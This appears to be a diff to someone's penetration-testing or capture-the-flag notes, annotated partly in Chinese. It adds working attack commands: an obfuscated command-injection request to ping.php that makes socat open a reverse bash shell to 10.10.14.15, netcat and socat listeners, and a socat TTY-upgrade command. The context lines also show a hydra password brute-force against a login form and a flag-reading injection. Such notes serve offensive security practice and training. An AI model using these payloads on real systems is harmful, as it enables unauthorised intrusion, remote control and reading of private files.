@@ -201,3 +201,18 @@ hydra -l admin -P /usr/share/SecLists/Passwords/darkweb2017-top100.txt "http-pos
 login and get a web terminal, use TAB or 'help' for available commands
 try IDOR in Burp
   GET /ping.php?ip=127.0.0.1%0acat${IFS}00112233_flag.txt HTTP/1.1
+  GET /ping.php?ip=127.0.0.1%0a's'o'c'a't'${IFS}TCP4:10.10.14.15:8443${IFS}EXEC:bash HTTP/1.1      获得 Socat 反向 shell
+  socat file:`tty`,raw,echo=0 tcp-listen:4443      监听 socat 反向 shell
+
+Upgrade interactive TTY
+  https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
+socat file:`tty`,raw,echo=0 tcp-listen:4443
+nc -lnvp 8443
+GET /ping.php?ip=127.0.0.1%0a's'o'c'a't'${IFS}TCP4:10.10.14.15:8443${IFS}EXEC:bash HTTP/1.1      获得 Socat 反向 shell
+nc -lnvp 4443
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.15:4443      升级 iTTY
+
+aureport --tty | less      读取审计日志，tty 历史
+  https://linux.die.net/man/8/aureport
+
+
